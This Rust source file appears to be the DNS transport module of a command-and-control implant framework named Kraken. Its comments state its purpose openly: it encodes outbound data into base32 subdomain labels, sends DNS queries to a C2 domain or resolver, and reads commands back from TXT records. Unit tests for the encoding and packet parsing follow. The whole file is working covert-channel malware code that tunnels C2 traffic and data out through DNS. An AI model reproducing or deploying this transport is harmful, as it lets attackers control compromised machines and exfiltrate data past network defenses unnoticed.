//! DNS Transport implementation
//!
//! Provides DNS-based C2 communication using:
//! - Subdomain encoding for outbound data (base32)
//! - TXT records for responses (up to 255 bytes per record)
//! - A records for simple status checks
//!
//! DNS queries are inherently limited in size, so this transport
//! chunks large payloads across multiple queries.

use common::{KrakenError, Transport};
use config::{DnsTransportConfig, TransportConfig, TransportType};
use std::net::{SocketAddr, UdpSocket};
use std::time::Duration;

/// Maximum label length in DNS (RFC 1035)
const MAX_LABEL_LEN: usize = 63;

/// Maximum labels we'll use for data encoding (leaving room for base domain)
const MAX_DATA_LABELS: usize = 4;

/// DNS record types
const DNS_TYPE_A: u16 = 1;
const DNS_TYPE_TXT: u16 = 16;

/// DNS class
const DNS_CLASS_IN: u16 = 1;

/// DNS Transport for C2 communication
pub struct DnsTransport {
    /// DNS resolver address (e.g., "8.8.8.8:53" or custom C2 DNS server)
    resolver: SocketAddr,
    /// Base domain for C2 (e.g., "c2.example.com")
    base_domain: String,
    /// Whether this transport is currently available
    available: bool,
    /// Transaction ID counter
    tx_id: u16,
    /// Timeout for DNS queries
    timeout: Duration,
}

#[allow(dead_code)]
impl DnsTransport {
    /// Create a new DNS transport
    pub fn new(resolver: SocketAddr, base_domain: &str) -> Self {
        Self {
            resolver,
            base_domain: base_domain.to_lowercase(),
            available: true,
            tx_id: 0,
            timeout: Duration::from_secs(10),
        }
    }

    /// Create a DNS transport with custom timeout
    pub fn with_timeout(resolver: SocketAddr, base_domain: &str, timeout: Duration) -> Self {
        let mut transport = Self::new(resolver, base_domain);
        transport.timeout = timeout;
        transport
    }

    /// Create a DNS transport from configuration
    ///
    /// # Arguments
    /// * `config` - Transport configuration with DNS-specific settings
    ///
    /// # Returns
    /// * `Some(DnsTransport)` if config is valid DNS transport
    /// * `None` if transport type is not DNS or config is invalid
    pub fn from_config(config: &TransportConfig) -> Option<Self> {
        if config.transport_type != TransportType::Dns {
            return None;
        }

        let resolver: SocketAddr = config.address.parse().ok()?;
        let dns_config = config.dns.as_ref()?;

        Some(Self {
            resolver,
            base_domain: dns_config.domain.to_lowercase(),
            available: true,
            tx_id: 0,
            timeout: Duration::from_secs(dns_config.timeout_secs),
        })
    }

    /// Create a DNS transport from DNS-specific config and resolver address
    pub fn from_dns_config(resolver: SocketAddr, dns_config: &DnsTransportConfig) -> Self {
        Self {
            resolver,
            base_domain: dns_config.domain.to_lowercase(),
            available: true,
            tx_id: 0,
            timeout: Duration::from_secs(dns_config.timeout_secs),
        }
    }

    /// Get next transaction ID
    fn next_tx_id(&mut self) -> u16 {
        self.tx_id = self.tx_id.wrapping_add(1);
        self.tx_id
    }

    /// Encode data as base32 (DNS-safe, case-insensitive)
    fn encode_base32(data: &[u8]) -> String {
        // Use RFC 4648 base32 without padding, lowercase for DNS compatibility
        const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";

        let mut result = String::new();
        let mut buffer: u64 = 0;
        let mut bits_in_buffer = 0;

        for &byte in data {
            buffer = (buffer << 8) | (byte as u64);
            bits_in_buffer += 8;

            while bits_in_buffer >= 5 {
                bits_in_buffer -= 5;
                let index = ((buffer >> bits_in_buffer) & 0x1F) as usize;
                result.push(ALPHABET[index] as char);
            }
        }

        // Handle remaining bits
        if bits_in_buffer > 0 {
            let index = ((buffer << (5 - bits_in_buffer)) & 0x1F) as usize;
            result.push(ALPHABET[index] as char);
        }

        result
    }

    /// Decode base32 data
    fn decode_base32(encoded: &str) -> Result<Vec<u8>, KrakenError> {
        let mut result = Vec::new();
        let mut buffer: u64 = 0;
        let mut bits_in_buffer = 0;

        for c in encoded.chars() {
            let value = match c.to_ascii_lowercase() {
                'a'..='z' => c.to_ascii_lowercase() as u8 - b'a',
                '2'..='7' => c as u8 - b'2' + 26,
                _ => continue, // Skip invalid characters
            };

            buffer = (buffer << 5) | (value as u64);
            bits_in_buffer += 5;

            if bits_in_buffer >= 8 {
                bits_in_buffer -= 8;
                result.push((buffer >> bits_in_buffer) as u8);
            }
        }

        Ok(result)
    }

    /// Split data into DNS-safe labels
    fn data_to_labels(&self, data: &[u8]) -> Vec<String> {
        let encoded = Self::encode_base32(data);
        let mut labels = Vec::new();

        for chunk in encoded.as_bytes().chunks(MAX_LABEL_LEN) {
            if let Ok(s) = std::str::from_utf8(chunk) {
                labels.push(s.to_string());
            }
        }

        // Limit to MAX_DATA_LABELS
        if labels.len() > MAX_DATA_LABELS {
            labels.truncate(MAX_DATA_LABELS);
        }

        labels
    }

    /// Build a full query name from data labels
    fn build_query_name(&self, labels: &[String]) -> String {
        let mut name = labels.join(".");
        if !name.is_empty() {
            name.push('.');
        }
        name.push_str(&self.base_domain);
        name
    }

    /// Build a DNS query packet
    fn build_query(&mut self, name: &str, qtype: u16) -> Vec<u8> {
        let mut packet = Vec::with_capacity(512);

        let tx_id = self.next_tx_id();

        // Header
        packet.extend_from_slice(&tx_id.to_be_bytes()); // Transaction ID
        packet.extend_from_slice(&0x0100u16.to_be_bytes()); // Flags: standard query, recursion desired
        packet.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT: 1 question
        packet.extend_from_slice(&0u16.to_be_bytes()); // ANCOUNT: 0
        packet.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT: 0
        packet.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT: 0

        // Question section - QNAME
        for label in name.split('.') {
            if label.is_empty() {
                continue;
            }
            packet.push(label.len() as u8);
            packet.extend_from_slice(label.as_bytes());
        }
        packet.push(0); // Null terminator

        // QTYPE and QCLASS
        packet.extend_from_slice(&qtype.to_be_bytes());
        packet.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());

        packet
    }

    /// Parse a DNS response and extract answer data
    fn parse_response(&self, response: &[u8], expected_type: u16) -> Result<Vec<u8>, KrakenError> {
        if response.len() < 12 {
            return Err(KrakenError::transport("DNS response too short"));
        }

        // Check flags
        let flags = u16::from_be_bytes([response[2], response[3]]);
        let qr = (flags >> 15) & 1;
        let rcode = flags & 0x0F;

        if qr != 1 {
            return Err(KrakenError::transport("not a DNS response"));
        }

        if rcode != 0 {
            return Err(KrakenError::transport(format!("DNS error: rcode={}", rcode)));
        }

        let ancount = u16::from_be_bytes([response[6], response[7]]);
        if ancount == 0 {
            return Err(KrakenError::transport("no answers in DNS response"));
        }

        // Skip question section
        let mut offset = 12;
        offset = self.skip_name(response, offset)?;
        offset += 4; // QTYPE + QCLASS

        // Parse first answer
        offset = self.skip_name(response, offset)?;

        if offset + 10 > response.len() {
            return Err(KrakenError::transport("truncated answer"));
        }

        let atype = u16::from_be_bytes([response[offset], response[offset + 1]]);
        offset += 2;
        let _aclass = u16::from_be_bytes([response[offset], response[offset + 1]]);
        offset += 2;
        let _ttl = u32::from_be_bytes([
            response[offset], response[offset + 1],
            response[offset + 2], response[offset + 3]
        ]);
        offset += 4;
        let rdlength = u16::from_be_bytes([response[offset], response[offset + 1]]) as usize;
        offset += 2;

        if offset + rdlength > response.len() {
            return Err(KrakenError::transport("truncated rdata"));
        }

        if atype != expected_type {
            return Err(KrakenError::transport(format!(
                "unexpected record type: got {}, expected {}",
                atype, expected_type
            )));
        }

        match expected_type {
            DNS_TYPE_A => {
                if rdlength != 4 {
                    return Err(KrakenError::transport("invalid A record length"));
                }
                Ok(response[offset..offset + 4].to_vec())
            }
            DNS_TYPE_TXT => {
                // TXT records have length-prefixed strings
                let mut txt_data = Vec::new();
                let mut txt_offset = offset;
                let end = offset + rdlength;

                while txt_offset < end {
                    let txt_len = response[txt_offset] as usize;
                    txt_offset += 1;
                    if txt_offset + txt_len > end {
                        break;
                    }
                    txt_data.extend_from_slice(&response[txt_offset..txt_offset + txt_len]);
                    txt_offset += txt_len;
                }

                // TXT data may be base32 encoded
                if txt_data.iter().all(|&b| b.is_ascii_alphanumeric()) {
                    if let Ok(s) = std::str::from_utf8(&txt_data) {
                        if let Ok(decoded) = Self::decode_base32(s) {
                            return Ok(decoded);
                        }
                    }
                }

                Ok(txt_data)
            }
            _ => Err(KrakenError::transport("unsupported record type")),
        }
    }

    /// Skip a DNS name in wire format, handling compression
    fn skip_name(&self, data: &[u8], mut offset: usize) -> Result<usize, KrakenError> {
        loop {
            if offset >= data.len() {
                return Err(KrakenError::transport("truncated name"));
            }

            let len = data[offset];

            // Check for compression pointer
            if (len & 0xC0) == 0xC0 {
                // Compression pointer - 2 bytes total, we're done
                return Ok(offset + 2);
            }

            if len == 0 {
                // End of name
                return Ok(offset + 1);
            }

            offset += 1 + (len as usize);
        }
    }

    /// Perform a DNS query and return the response
    fn do_query(&mut self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        // Encode data into DNS labels
        let labels = self.data_to_labels(data);
        let query_name = self.build_query_name(&labels);

        // Build TXT query (for data transfer)
        let query = self.build_query(&query_name, DNS_TYPE_TXT);

        // Create UDP socket
        let socket = UdpSocket::bind("0.0.0.0:0")
            .map_err(|e| KrakenError::transport(format!("failed to bind: {}", e)))?;

        socket.set_read_timeout(Some(self.timeout))
            .map_err(|e| KrakenError::transport(format!("failed to set timeout: {}", e)))?;

        // Send query
        socket.send_to(&query, self.resolver)
            .map_err(|e| KrakenError::transport(format!("failed to send: {}", e)))?;

        // Receive response
        let mut response = [0u8; 512];
        let (len, _) = socket.recv_from(&mut response)
            .map_err(|e| KrakenError::transport(format!("failed to receive: {}", e)))?;

        // Parse response
        self.parse_response(&response[..len], DNS_TYPE_TXT)
    }
}

impl Transport for DnsTransport {
    fn id(&self) -> &'static str {
        "dns"
    }

    fn exchange(&self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        // We need mutable self for tx_id, but trait requires immutable
        // Use interior mutability pattern with a copy
        let mut transport = DnsTransport {
            resolver: self.resolver,
            base_domain: self.base_domain.clone(),
            available: self.available,
            tx_id: self.tx_id,
            timeout: self.timeout,
        };
        transport.do_query(data)
    }

    fn is_available(&self) -> bool {
        self.available
    }

    fn reset(&mut self) {
        self.available = true;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encode_base32() {
        // "hello" in base32 is "nbswy3dp" (without padding)
        let encoded = DnsTransport::encode_base32(b"hello");
        assert_eq!(encoded, "nbswy3dp");
    }

    #[test]
    fn test_decode_base32() {
        let decoded = DnsTransport::decode_base32("nbswy3dp").unwrap();
        assert_eq!(decoded, b"hello");
    }

    #[test]
    fn test_base32_roundtrip() {
        let data = b"The quick brown fox jumps over the lazy dog";
        let encoded = DnsTransport::encode_base32(data);
        let decoded = DnsTransport::decode_base32(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_base32_binary_data() {
        let data: Vec<u8> = (0..=255).collect();
        let encoded = DnsTransport::encode_base32(&data);
        let decoded = DnsTransport::decode_base32(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_data_to_labels() {
        let transport = DnsTransport::new("8.8.8.8:53".parse().unwrap(), "c2.test");

        // Short data - single label
        let labels = transport.data_to_labels(b"hi");
        assert_eq!(labels.len(), 1);
        assert!(labels[0].len() <= MAX_LABEL_LEN);

        // Longer data - multiple labels
        let long_data = vec![0u8; 100];
        let labels = transport.data_to_labels(&long_data);
        assert!(labels.len() <= MAX_DATA_LABELS);
        for label in &labels {
            assert!(label.len() <= MAX_LABEL_LEN);
        }
    }

    #[test]
    fn test_build_query_name() {
        let transport = DnsTransport::new("8.8.8.8:53".parse().unwrap(), "c2.test");

        let name = transport.build_query_name(&["abc".to_string(), "def".to_string()]);
        assert_eq!(name, "abc.def.c2.test");

        let name = transport.build_query_name(&[]);
        assert_eq!(name, "c2.test");
    }

    #[test]
    fn test_build_query() {
        let mut transport = DnsTransport::new("8.8.8.8:53".parse().unwrap(), "c2.test");
        let query = transport.build_query("test.c2.test", DNS_TYPE_TXT);

        // Verify header structure
        assert!(query.len() >= 12);

        // Check flags (standard query, RD=1)
        assert_eq!(query[2], 0x01);
        assert_eq!(query[3], 0x00);

        // Check QDCOUNT = 1
        assert_eq!(u16::from_be_bytes([query[4], query[5]]), 1);
    }

    #[test]
    fn test_skip_name_simple() {
        let transport = DnsTransport::new("8.8.8.8:53".parse().unwrap(), "c2.test");

        // Build a simple name: "test.c2.test"
        let data = vec![
            4, b't', b'e', b's', b't',  // "test"
            2, b'c', b'2',               // "c2"
            4, b't', b'e', b's', b't',  // "test"
            0,                           // terminator
            0, 16,                       // QTYPE = TXT
            0, 1,                        // QCLASS = IN
        ];

        let offset = transport.skip_name(&data, 0).unwrap();
        assert_eq!(offset, 14); // All labels plus null terminator
    }

    #[test]
    fn test_skip_name_compression() {
        let transport = DnsTransport::new("8.8.8.8:53".parse().unwrap(), "c2.test");

        // Compression pointer format: 0xC0 | offset_high, offset_low
        let data = vec![
            0xC0, 0x0C,  // Pointer to offset 12
            0, 16,       // QTYPE
            0, 1,        // QCLASS
        ];

        let offset = transport.skip_name(&data, 0).unwrap();
        assert_eq!(offset, 2); // Compression pointer is 2 bytes
    }
}
